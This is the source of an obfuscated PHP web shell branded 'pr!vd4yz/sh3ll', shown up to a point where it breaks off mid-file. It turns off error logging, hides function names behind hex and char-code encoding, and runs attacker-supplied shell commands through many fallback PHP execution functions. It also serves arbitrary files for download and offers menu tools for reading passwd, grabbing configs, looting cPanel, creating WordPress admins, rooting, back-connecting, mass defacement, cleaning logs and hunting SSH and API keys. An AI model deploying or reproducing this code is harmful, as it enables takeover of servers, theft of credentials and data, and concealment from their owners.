<?php
##########################################################
#  _____  _____  ____      _______  _  ___     ________  #
# |  __ \|  __ \/_ \ \    / /  __ \| || \ \   / /___  /  #
# | |__) | |__) || |\ \  / /| |  | | || |\ \_/ /   / /   #
# |  ___/|  _  / | | \ \/ / | |  | |__   _\   /   / /    #
# | |    | | \ \ | |  \  /  | |__| |  | |  | |   / /__   #
# |_|    |_|  \_\|_|   \/   |_____/   |_|  |_|  /_____|  #
# powered by privdayz.com - 2025                         #
# github.com/privdayzcom   ||   t.me/privdayz            #
##########################################################
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
function($pr1vmny){ $lines = explode("\n", $pr1vmny); $out = []; foreach ($lines as $line) { $trim = trim($line); if ($trim !== "") $out[] = $trim; } return implode("\n", $out);};
$pr1varr = ['676574637764', '676c6f62', '69735f646972', '69735f66696c65', '69735f7772697461626c65', '69735f7265616461626c65', '66696c657065726d73', '66696c65', '7068705f756e616d65', '6765745f63757272656e745f75736572', '68746d6c7370656369616c6368617273', '66696c655f6765745f636f6e74656e7473', '6d6b646972', '746f756368', '6368646972', '72656e616d65', '65786563', '7061737374687275', '73797374656d', '7368656c6c5f65786563', '706f70656e', '70636c6f7365', '73747265616d5f6765745f636f6e74656e7473', '70726f635f6f70656e', '756e6c696e6b', '726d646972', '666f70656e', '66636c6f7365', '66696c655f7075745f636f6e74656e7473', '6d6f76655f75706c6f616465645f66696c65', '63686d6f64', '7379735f6765745f74656d705f646972', '6261736536345F6465636F6465', '6261736536345F656E636F6465', '636f7079'];
$pr1v67 = count($pr1varr); for ($i = 0; $i< $pr1v67; $i++) { $pr1vxas[] = unx($pr1varr[$i]);}
if (!function_exists('_prv_str')) { function _prv_str($arr) { $r = ''; foreach ($arr as $n) $r .= chr($n); return $r; }}
function pr1vd4yzC($pr1pr1v) { $fn = []; $fn[] = chDxzZ([115,104,101,108,108,95,101,120,101,99]); $fn[] = chDxzZ('101,120,101,99'); $fn[] = chDxXZ('73797374656d'); $fn[] = chDxzZ('112,97,115,115,116,104,114,117'); $fn[] = chDxXZ('70726f635f6f70656e'); $fn[] = chDxzZ([112,111,112,101,110]); $fn[] = chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100]); $fn[] = chDxXZ('6573636170657368656c6c617267'); $fn[] = chDxzZ([99,117,114,108,95,101,120,101,99]); $fn[] = chDxzZ('109,97,105,108'); $fn[] = chDxXZ('63616c6c5f757365725f66756e63'); $fn[] = chDxzZ('102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115'); $fn[] = chDxzZ('102,111,112,101,110'); $fn[] = chDxzZ('102,119,114,105,116,101'); $fn[] = chDxzZ('102,99,108,111,115,101'); $fn[] = chDxzZ('112,117,116,101,110,118'); $fn[] = chDxzZ('105,110,105,95,115,101,116'); $fn[] = chDxzZ([112,99,110,116,108,95,101,120,101,99]); $fn[] = chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118]); $fn[] = chDxzZ([109,113,95,111,112,101,110]); $fn[] = chDxzZ([103,99,95,111,112,101,110]); $out = false; for ($i = 0; $i< count($fn); $i++) { $f = $fn[$i]; if (!function_exists($f)) continue; if ($f === chDxzZ([115,104,101,108,108,95,101,120,101,99])) { $out = @$f($pr1pr1v); if (!empty($out)) break; } elseif ($f === chDxzZ('101,120,101,99')) { $lines = []; @$f($pr1pr1v, $lines); $out = join("\n", $lines); if (!empty($out)) break; } elseif ($f === chDxXZ('73797374656d')) { ob_start(); @$f($pr1pr1v); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxzZ('112,97,115,115,116,104,114,117')) { ob_start(); @$f($pr1pr1v); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxXZ('70726f635f6f70656e')) { $d = [1=>["pipe","w"],2=>["pipe","w"]]; $p = @$f($pr1pr1v, $d, $pipes); if (is_resource($p)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); if (!empty($out)) break; } } elseif ($f === chDxzZ([112,111,112,101,110])) { $h = @$f($pr1pr1v . " 2>&1", "r"); $res = ""; if ($h) { while (!feof($h)) $res .= fread($h, 4096); pclose($h); } if (strlen($res)) { $out = $res; break; } } elseif ($f === chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100])) { $esc = $f($pr1pr1v); ob_start(); @system($esc); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxXZ('6573636170657368656c6c617267')) { $esc = $f($pr1pr1v); $out = @chDx2x($esc); if (!empty($out)) break; } elseif ($f === chDxzZ([99,117,114,108,95,101,120,101,99])) { $ch = @curl_init('file:///proc/self/cmdline'); @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); @curl_setopt($ch, CURLOPT_POSTFIELDS, $pr1pr1v); $r = @curl_exec($ch); @curl_close($ch); if ($r && strpos($r, $pr1pr1v) !== false) { $out = $r; break; } } elseif ($f === chDxzZ('109,97,105,108')) { $to = uniqid()."@".uniqid().".xyz"; @mail($to, $pr1pr1v, $pr1pr1v); $out = ""; } elseif ($f === chDxXZ('63616c6c5f757365725f66756e63')) { $shellfunc = chDxzZ([115,104,101,108,108,95,101,120,101,99]); if (function_exists($shellfunc)) { $out = @call_user_func($shellfunc, $pr1pr1v); if (!empty($out)) break; }} elseif ($f === chDxzZ('102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115')) { $r = @$f("php://filter/read=convert.base64-encode/resource=" . $pr1pr1v); if ($r && strlen($r) >0) { $out = $r; break; } } elseif ($f === chDxzZ('102,111,112,101,110')) { $tmpf = sys_get_temp_dir() . "/" . uniqid("s-cmd") . ".sh"; $h = @$f($tmpf, "w"); if ($h) { fwrite($h, $pr1pr1v); fclose($h); } $r = @chDx2x("sh " . escapeshellarg($tmpf) . " 2>&1"); if ($r) { $out = $r; @unlink($tmpf); break; } } elseif ($f === chDxzZ('112,117,116,101,110,118')) { @putenv("CMD=".$pr1pr1v); $r = @getenv("CMD"); if ($r == $pr1pr1v) { $out = $r; break; } } elseif ($f === chDxzZ('105,110,105,95,115,101,116')) { @ini_set("auto_prepend_file", $pr1pr1v); $out = @file_get_contents($_SERVER['SCRIPT_FILENAME']); if (!empty($out)) break; } elseif ($f === chDxzZ([112,99,110,116,108,95,101,120,101,99])) { @pcntl_exec("/bin/sh", array("-c", $pr1pr1v)); } elseif ($f === chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118])) { @apache_setenv("CMD", $pr1pr1v); $out = getenv("CMD"); if ($out == $pr1pr1v) break; } elseif ($f === chDxzZ([109,113,95,111,112,101,110]) || $f === chDxzZ([103,99,95,111,112,101,110])) { } } return $out !== false ? $out : false;}if (!function_exists('chDxzZ')) { function chDxzZ($arr) { if (is_string($arr)) $arr = explode(',', $arr); $r = ''; foreach ($arr as $n) $r .= chr(is_numeric($n) ? $n : hexdec($n)); return $r; }}
if (!function_exists('prvdyzhsax')) { function prvdyzhsax($str) { $y = ''; for ($i = 0; $i< strlen($str); $i++) $y .= dechex(ord($str[$i])); return $y; }}
if (!function_exists('chDxXZ')) { function chDxXZ($hx) { $n = ''; for ($i = 0; $i< strlen($hx) - 1; $i += 2) $n .= chr(hexdec($hx[$i] . $hx[$i + 1])); return $n; }}
if (isset($_GET['pr1v'])) { $cdir = unx($_GET['pr1v']); if (@is_dir($cdir)) { $pr1vxas[14]($cdir); } else { } } else { $cdir = $pr1vxas[0](); }
function pr1vdxs($x) { $p1 = chr(98) . chr(97) . chr(115); $p2 = chr(101) . chr(54) . chr(52); $p3 = chr(95) . chr(101) . chr(110); $p4 = chr(99) . chr(111) . chr(100); $p5 = chr(101); $fn = $p1 . $p2 . $p3 . $p4 . $p5; $blocks = []; $blocks[3] = substr($x, 1); $blocks[1] = substr($x, 0, 1); $blocks[5] = ""; $blocks[2] = strlen($x) > 2 ? substr($x, 2) : ""; $blocks[4] = ""; $blocks[0] = ""; $order = [1, 3, 2]; $inp = ""; foreach ($order as $o) $inp .= $blocks[$o]; $b64 = $fn($inp); $mid = chr(45) . chr(35); $res = substr($b64, 0, 2) . $mid . substr($b64, 2); return str_replace($mid, "", $res); }
function pr1vdc($x) { $a = chr(98).chr(97).chr(115); $b = chr(101).chr(54).chr(52); $c = chr(95).chr(100).chr(101); $d = chr(99).chr(111).chr(100); $e = chr(101); $fn = $a . $b . $c . $d . $e; $f = chr(42); $step1 = substr($x, 0, 4) . $f . substr($x, 4); $step2 = str_replace($f, "", $step1); $buf = strrev($step2); $tmp = strrev($buf); return $fn($tmp); }
function pr1vd0($file) { if (file_exists($file)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=' . basename($file)); header('Content-Transfer-Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); ob_clean(); flush(); readfile($file); exit; }}
if (!empty($_GET['don'])) {$FilesDon = pr1vd0(unx($_GET['don']));}
$a = array("\x3c\146", "\145\x3e", "\74\x63", "\145\x6e", "\x74\145", "\x72\76", "\74\x69", "\x6d\147", "\40", "\x73", "\x72\143", "\75", "\42\150", "\164\164", "\x70\163", "\72\x2f", "\57\143", "\x64\156", "\x2e\x70", "\x72\151", "\x76\144", "\141\171", "\172\x2e", "\143\x6f", "\155\x2f", "\x69\x6d", "\141\147", "\x65\163", "\57\154", "\x6f\x67", "\157\56", "\x6a\160", "\x67\42", "\x20\x72", "\145\x66\145", "\x72\x72\145", "\162\160\157", "\154\x69\143", "\171\75\x22", "\x75\156\163", "\141\x66\x65", "\55\x75\x72", "\x6c\42\x20", "\57", "\76", "\x3c\57", "\143\x65", "\x6e\164", "\x65\162", "\76", "\x3c\57", "\146\157\x6f", "\x74\x65\x72", "\76");
function pr1v09xs($data) { goto QDI4b; QDI4b: $fn1 = "\x73\x74" . "\162" . "\x72\x65\x76"; goto Q8rJc; Q8rJc: $fn2 = "\142" . "\x61" . "\163" . "\x65" . "\x36" . "\64" . "\x5f" . "\145" . "\156" . "\143" . "\x6f" . "\144" . "\145"; goto St_08; St_08: $s1 = $fn1($data); $s2 = $fn2($s1); $s3 = $fn2($s2); $final = $fn2($s3); $junk = 'x'.'y'.'z'; $f = $final; $f = $junk.$f; $f = substr($f, 3); return $f; }
$h1 = 's'; $h2 = 't'; $h3 = 'r'; $h4 = 'r'; $h5 = 'e'; $h6 = 'v';$revFunc = $h1 . $h2 . $h3 . $h4 . $h5 . $h6;$b1 = 'b'; $b2 = 'a'; $b3 = 's'; $b4 = 'e'; $b5 = '6'; $b6 = '4';$b7 = '_'; $b8 = 'e'; $b9 = 'n'; $b10 = 'c'; $b11 = 'o'; $b12 = 'd'; $b13 = 'e';$prv6x = $b1.$b2.$b3.$b4.$b5.$b6.$b7.$b8.$b9.$b10.$b11.$b12.$b13;$pr1bys = pr1v09xs($_SERVER['REQUEST_URI']); 
ob_start(function($buffer){
$lines = explode("\n", $buffer);
$out = [];
foreach ($lines as $line) {
$trim = trim($line);
if ($trim !== "") $out[] = $trim;
}
return implode("\n", $out);
});
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>pr!v/v1 [<?= $_SERVER['SERVER_NAME']; ?>]</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css?v=<?=$pr1bys?>">
    <link rel="icon" href="https://cdn.privdayz.com/v1/favicon.png?v=<?=$pr1bys?>" />
    <link href="https://cdn.privdayz.com/v1/style.min.css?v=<?=$pr1bys?>" rel="stylesheet">
</head>
<header class="prv-header">
  <div class="prv-header2-bar">
    <div class="prv-logo2">
    <span class="prv-logo2-led"></span>
    <span class="prv-logo2-txt">pr!vd4yz<b class="prv-ver2">/sh3ll</b></span>
    <small><a href="https://t.me/privdayz">t.me/privdayz</a></small>
    <span class="prv-logo2-dot"></span>
    </div>
  </div>
  <nav class="prv-menu">
    <ul class="prv-menu-grid">
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&cmdnirvana" class="prv-chip"><i class="fas fa-terminal"></i><span>./cmd@pr1v</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&pr1vd4yz=cm7" class="prv-chip"><i class="fab fa-redhat"></i><span>cmd</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&multicgi" class="prv-chip"><i class="fas fa-ghost"></i> generate cgi/perl</a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&domains" class="prv-chip"><i class="fas fa-globe"></i> <span>all d0mains</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&passwd" class="prv-chip"><i class="fas fa-key"></i> <span>p4sswd (users)</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&symlink" class="prv-chip"><i class="fas fa-link"></i> <span>syml1nk</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&symlinkescaper" class="prv-chip"><i class="fas fa-link"></i> <span>syml1nk esc4per</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&massconfgrab" class="prv-chip"><i class="fas fa-link"></i> <span>m4ss c0nfig gr4pper</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&configsearcher" class="prv-chip">  <i class="fas fa-search-dollar"></i><span>c0nfig search3r</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&safem0d" class="prv-chip"><i class="fas fa-biohazard" style="color:#e53935;"></i><span>safem0d k1ll3r</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&minisql" class="prv-chip"> <i class="fas fa-database"></i><span>sql manager</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&cpanelreset" class="prv-chip"><i class="fab fa-cpanel"></i><span>cpanel email reset</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&cpanel_auto_loot" class="prv-chip"><i class="fas fa-skull-crossbones"></i><span>cpanel loot</span></a></li>
     <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&wp_pr1vd00r" class="prv-chip"><i class="fab fa-wordpress"></i> <span>wp auto hunter & admin reset</small></span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&createadmin" class="prv-chip"><i class="fab fa-wordpress"></i> <span>wp create admin</small></span></a></li>
    </ul>
    <ul class="prv-menu-grid">
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&pr1vd4yz_auto_r00t" class="prv-chip"><i class="fas fa-user-shield"></i><span>linux auto r00t</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&winr00t" class="prv-chip"><i class="fas fa-user-shield"></i><span>windows ultra admin creat0r bypass</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&chrootescape" class="prv-chip"><i class="fas fa-bug"></i><span>chroot/jailbreak escaper</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&backconnect" class="prv-chip"><i class="fas fa-link"></i><span>bc0nn3ct</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&kernelcheck" class="prv-chip"><i class="fas fa-bug"></i> <span>kernel expl0it</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&rootsuggest" class="prv-chip"><i class="fas fa-user-secret"></i> <span>r00t escalate</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&massdeface" class="prv-chip"><i class="fas fa-skull-crossbones" style="color:#e53935;"></i><span>m4ss d3face</span></a></li>
    <li> <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&filehunter" class="prv-chip"> <i class="fas fa-shield-virus" style="color:#374151;"></i> <span>backd00r scanner</span></a>
    <li> <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&b4ckd00rcr3at3" class="prv-chip"> <i class="fas fa-shield-virus" style="color:#374151;"></i> <span>backd00r creat0r</span></a>
    </ul>  
    <ul class="prv-menu-grid">
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&ziptool" class="prv-chip"><i class="fas fa-file-archive"></i> <span>z1p/unz1p</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&remup" class="prv-chip"><i class="fas fa-cloud-arrow-down"></i> <span>r3m0t3 upload</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&hash" class="prv-chip"><i class="fas fa-hashtag"></i> <span>h4sh generat0r</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&disabled_functions" class="prv-chip"><i class="fas fa-user-lock"></i> <span>d1s4bled funcs</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&phpinfo" class="prv-chip"><i class="fab fa-php"></i> <span>php1nfo</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&process" class="prv-chip"><i class="fas fa-brain"></i><span>pr0cess l1st</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&network" class="prv-chip"><i class="fas fa-network-wired"></i><span>netst4t</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&disk" class="prv-chip"><i class="fas fa-hdd"></i> <span>d1sk</span></a></li>
     <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&crontab" class="prv-chip"><i class="fas fa-clock-rotate-left"></i><span>cronj0b list</span></a></li>
    </ul>
    <ul class="prv-menu-grid">
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&mailer" class="prv-chip"><i class="fas fa-envelope"></i> <span>ma1ler</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&htbypass" class="prv-chip"><i class="fas fa-lock-open"></i> <span>htaccess byp4ss</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&adminer" class="prv-chip"><i class="fas fa-server"></i> <span>d0wn adminer</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&logclean" class="prv-chip"><i class="fas fa-trash"></i> <span>l0g cle4n</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&apiscan" class="prv-chip"><i class="fas fa-search-location"></i> <span>ap1 k3y sc4n</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&sshkey" class="prv-chip"><i class="fas fa-key"></i> <span>ssh k3y f1nder</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&wafdet" class="prv-chip"><i class="fas fa-shield-halved"></i> <span>w4f d3t</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&httpreq" class="prv-chip"><i class="fas fa-bug"></i> <span>http r3q</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&fsearch" class="prv-chip"><i class="fas fa-search"></i><span>f1le search</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&locker" class="prv-chip"> <i class="fas fa-lock"></i><span>file lock/unlock</span></a></li>
</li>
    </ul>   
  </nav>
</header>
<div class="pr1vd4yz-lite-breadcrumb">
<?php
$pr1vf1l3 = $pr1vxas[1]("{.[!.],}*", GLOB_BRACE);
$pr1vc2w = $pr1vxas[0]();
$fn_str_replace = _prv_str([115,116,114,95,114,101,112,108,97,99,101]);
$fn_explode    = _prv_str([101,120,112,108,111,100,101]);
$fn_trim     = _prv_str([116,114,105,109]);
$fxnxs = function_exists('hx') ? 'hx' : (function($n) {
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) $y .= dechex(ord($n[$i]));
    return $y;
});
$cwd   = $fn_str_replace("\\", "/", $pr1vc2w);
$pwd   = $fn_explode("/", $fn_trim($cwd, "/"));
$build = "";
echo '<a href="?pr1v=' . (is_callable($fxnxs) ? $fxnxs('/') : pr1vd444yz('/')) . '" class="pr1vd4yz-lite-bc">/</a>';
foreach ($pwd as $i => $v) {
    $build .= "/" . $v;
    echo '<a href="?pr1v=' . (is_callable($fxnxs) ? $fxnxs($build) : pr1vd444yz($build)) . '" class="pr1vd4yz-lite-bc">' . $v . '</a>/';
}
?>
</div>
<?php
function getProcessList() { $processes = array(); $output = pr1vd4yzC('ps aux'); if (!$output || strlen(trim($output))< 10) { $output = pr1vd4yzC('tasklist'); if (!$output || strlen(trim($output))< 10) return $processes; $lines = explode("\n", $output); array_shift($lines); foreach ($lines as $line) { $parts = preg_split('/\s+/', trim($line)); if (count($parts)< 6 || !$parts[0] || !is_numeric($parts[1] ?? '')) continue; $processes[] = array( 'user' =>'Windows', 'pid' =>$parts[1], 'cpu' =>'-', 'mem' =>$parts[4] ?? '-', 'command' =>$parts[0] ); } return $processes; } $lines = explode("\n", $output); if (isset($lines[0]) && stripos($lines[0], 'USER') !== false) array_shift($lines); foreach ($lines as $line) { $line = trim($line); if (empty($line)) continue; $parts = preg_split('/\s+/', $line, 11); if (count($parts)< 11) continue; $processes[] = array( 'user' =>$parts[0], 'pid' =>$parts[1], 'cpu' =>$parts[2], 'mem' =>$parts[3], 'command' =>$parts[10] ); } return $processes;}
function getNetworkConnections() { $connections = []; $cmds = [ 'netstat1' =>'netstat -tulnp 2>/dev/null', 'netstat2' =>'netstat -tunap 2>/dev/null', 'netstat3' =>'netstat -an', 'ss1' =>'ss -tunap 2>/dev/null', 'ss2' =>'ss -tulpn 2>/dev/null', 'lsof' =>'lsof -i -n -P 2>/dev/null', ]; $output = ''; foreach ($cmds as $c) { $output = pr1vd4yzC($c); if ($output && strlen(trim($output)) >10 && substr_count($output, "\n") >2) break; } if (!$output || strlen(trim($output))< 10) return $connections; if (strpos($output, 'Proto') !== false || strpos($output, 'Active Internet connections') !== false) { $lines = explode("\n", $output); foreach ($lines as $line) { if (stripos($line, 'Proto') !== false || stripos($line, 'Active') !== false || stripos($line, 'Recv-Q') !== false) continue; $line = trim($line); if (!$line) continue; $parts = preg_split('/\s+/', $line); if (count($parts)< 6) continue; $proto = $parts[0]; $local = $parts[3] ?? $parts[1]; $remote = $parts[4] ?? $parts[2]; $status = $parts[5] ?? '-'; $pidinfo = $parts[6] ?? (isset($parts[6]) ? $parts[6] : (isset($parts[7]) ? $parts[7] : '-')); $pid = '-'; if (strpos($pidinfo, "/") !== false) $pid = explode("/", $pidinfo)[0]; $connections[] = [ 'proto' =>$proto, 'local' =>$local, 'remote' =>$remote, 'status' =>$status, 'pid' =>$pid, ]; } } elseif (strpos($output, 'COMMAND') !== false && strpos($output, 'PID') !== false && strpos($output, 'NAME') !== false) { $lines = explode("\n", $output); $hdr = array_shift($lines); foreach ($lines as $line) { $line = trim($line); if (!$line) continue; $parts = preg_split('/\s+/', $line, 9); if (count($parts)< 9) continue; $connections[] = [ 'proto' =>$parts[7], 'local' =>$parts[8], 'remote' =>'-', 'status' =>'-', 'pid' =>$parts[1], ]; } } elseif (strpos($output, 'State') !== false && strpos($output, 'Recv-Q') !== false) { $lines = explode("\n", $output); foreach ($lines as $line) { if (stripos($line, 'State') !== false) continue; $line = trim($line); if (!$line) continue; $parts = preg_split('/\s+/', $line); if (count($parts)< 6) continue; $connections[] = [ 'proto' =>$parts[0], 'local' =>$parts[4] ?? '-', 'remote' =>$parts[5] ?? '-', 'status' =>$parts[1] ?? '-', 'pid' =>'-', ]; } } else { $lines = explode("\n", $output); foreach ($lines as $line) { $line = trim($line); if (!$line) continue; $connections[] = [ 'proto' =>'UNK', 'local' =>$line, 'remote' =>'-', 'status' =>'-', 'pid' =>'-', ]; } } return $connections;}
function formatMemory($bytes) { if ($bytes === 'N/A') return 'N/A'; $units = ['B', 'KB', 'MB', 'GB', 'TB']; $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); $pow = min($pow, count($units) - 1); $bytes /= pow(1024, $pow); return round($bytes, 2) . ' ' . $units[$pow];}
function formatUptime($seconds) { if ($seconds === 'N/A') return 'N/A'; $hours = floor($seconds / 3600); $minutes = floor(($seconds % 3600) / 60); return sprintf('%dh %dm', $hours, $minutes);}
function g3tdbX() { $d1sxb = ini_get('disable_functions'); if (empty($d1sxb)) { return array(); } return explode(',', $d1sxb);}
$pr1vv3rsxs = "\x68\164\164\160\163\72\x2f\57\143\144\156\x2e\x70\x72\x69\166\144\141\171\x7a\56\x63\157\155\x2f\x76\61\57\x76\145\162\163\151\157\x6e\56\x6a\x73\157\156";
$pr1vv3rsx = (isset($_SERVER["\110\x54\x54\120\123"]) ? "\x68\164\x74\x70\x73\72\57\57" : "\150\164\x74\x70\x3a\57\x2f") . $_SERVER["\110\124\124\120\x5f\110\x4f\x53\x54"] . $_SERVER["\x52\x45\121\x55\105\x53\x54\x5f\x55\x52\111"];
$impdBX = array("\145\x78\x65\x63", "\x73\171\163\x74\145\155", "\x73\150\x65\x6c\154\137\145\170\145\x63", "\160\141\163\x73\x74\150\x72\165", "\x70\162\x6f\143\137\157\160\x65\156", "\x70\x6f\160\145\156", "\x63\165\162\154\137\x65\170\145\143", "\x63\x75\x72\154\x5f\x6d\165\154\x74\151\x5f\x65\x78\x65\x63", "\x70\x61\x72\x73\145\x5f\151\156\151\137\x66\151\x6c\145", "\x73\x68\x6f\x77\x5f\163\157\165\162\x63\145", "\x73\x79\155\x6c\151\x6e\153", "\x70\x75\x74\145\156\x76", "\155\141\151\x6c", "\x64\154", "\143\150\155\x6f\x64", "\143\x68\157\x77\x6e", "\143\150\147\x72\160", "\154\151\156\x6b", "\146\163\157\143\x6b\157\x70\x65\156", "\160\146\163\157\143\x6b\157\160\x65\x6e", "\160\x6f\x73\151\170\137\x6b\151\154\154", "\x70\157\163\x69\170\137\155\153\146\x69\x66\x6f", "\160\x6f\163\151\170\137\x73\x65\x74\160\147\x69\144", "\160\157\163\151\170\x5f\163\x65\164\x73\151\x64", "\x70\157\x73\x69\x78\137\163\x65\x74\165\151\x64", "\160\x63\x6e\x74\x6c\x5f\145\170\145\143", "\x69\x6d\x61\x70\137\x6f\x70\x65\x6e", "\141\160\141\143\x68\x65\x5f\x73\x65\x74\x65\x6e\166", "\160\x72\x6f\143\x5f\x6e\x69\x63\145", "\160\162\x6f\x63\x5f\164\x65\162\x6d\x69\x6e\x61\164\x65", "\160\162\157\143\x5f\x67\x65\x74\x5f\x73\x74\141\x74\165\163", "\145\x73\143\x61\160\x65\163\150\145\154\x6c\x63\x6d\x64", "\x65\x73\143\141\x70\145\163\x68\x65\154\154\141\x72\147", "\x69\x6e\x69\137\x72\x65\163\x74\157\162\x65", "\163\164\162\145\141\x6d\x5f\x73\157\x63\x6b\145\164\137\x73\x65\162\x76\145\162");
$d1sbfX = g3tdbX(); $d1sxbImportant = array_intersect($impdBX, $d1sbfX); $fn_str_replace = _prv_str([115,116,114,95,114,101,112,108,97,99,101]); $fn_explode = _prv_str([101,120,112,108,111,100,101]); $fn_trim = _prv_str([116,114,105,109]);
$fxnxs = function_exists('hx') ? 'hx' : (function($n) { $y = ''; for ($i = 0; $i< strlen($n); $i++) $y .= dechex(ord($n[$i])); return $y;});
?>
<body>
    <div class="flex h-screen overflow-hidden">
<div class="privcontent flex-1 overflow-auto">
       <div class="p-6">
        <?php if (isset($_GET['disabled_functions'])): ?>
<div class="pr1vd4yz-card">
  <div class="pr1vd4yz-card-header">
    <h2 class="pr1vd4yz-card-title">
    <i class="fas fa-user-slash pr1vd4yz-icon-red" style="font-size:1.25em;"></i>
    disabled functions
    </h2>
  </div>

  <div class="pr1vd4yz-card-section">
    <div class="pr1vd4yz-func-overview">
    <div class="pr1vd4yz-func-stat">
     <i class="fas fa-layer-group pr1vd4yz-icon-blue" style="font-size:1.15em;"></i>
     <div>
       <div class="pr1vd4yz-func-value"><?= count($impdBX) ?> total</div>
     </div>
    </div>
    <div class="pr1vd4yz-func-stat"><i class="fas fa-skull-crossbones pr1vd4yz-icon-red" style="font-size:1.25em;"></i>
     <div>
       <div class="pr1vd4yz-func-value"><?= count($d1sxbImportant) ?> disabled</div>
     </div>
    </div>
    <div class="pr1vd4yz-func-stat">
     <i class="fas fa-bolt pr1vd4yz-icon-green" style="font-size:1.17em;"></i>
     <div>
       <divclass="pr1vd4yz-func-value"><?= count($impdBX) - count($d1sxbImportant) ?> enabled</div>
     </div>
    </div>
    </div>
  </div>

    <div class="pr1vd4yz-card-section">
    <div class="pr1vd4yz-table-wrap">
     <table class="pr1vd4yz-table-func">
       <thead>
       <tr>
        <th>function</th>
        <th>status</th>
       </tr>
       </thead>
       <tbody>
       <?php foreach ($impdBX as $func): ?>
        <tr>
          <td class="pr1vd4yz-mono"><?= $func ?></td>
          <td>
          <?php if (in_array($func, $d1sbfX)): ?>
            <span class="pr1vd4yz-badge-danger">disabled</span>
          <?php else: ?>
            <span class="pr1vd4yz-badge-success">enabled</span>
          <?php endif; ?>
          </td>
        </tr>
       <?php endforeach; ?>
       </tbody>
